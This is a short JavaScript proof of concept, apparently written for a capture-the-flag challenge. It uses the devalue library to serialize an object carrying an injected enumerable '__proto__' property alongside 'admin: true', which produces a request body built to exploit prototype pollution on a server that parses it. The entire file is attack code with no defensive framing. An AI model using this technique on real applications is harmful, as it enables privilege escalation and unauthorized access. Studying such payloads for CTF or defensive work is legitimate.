import { stringify } from 'devalue';
class FlagRequest { constructor(feedback) { this.feedback = feedback; } }
const real = new FlagRequest('test');
const payload = { admin: true };
Object.defineProperty(payload, '__proto__', { value: real, enumerable: true });
const body = stringify(payload, {
  FlagRequest(value) {
    if (value instanceof FlagRequest) {
      return [value.feedback];
    }
  }
});
console.log(body);
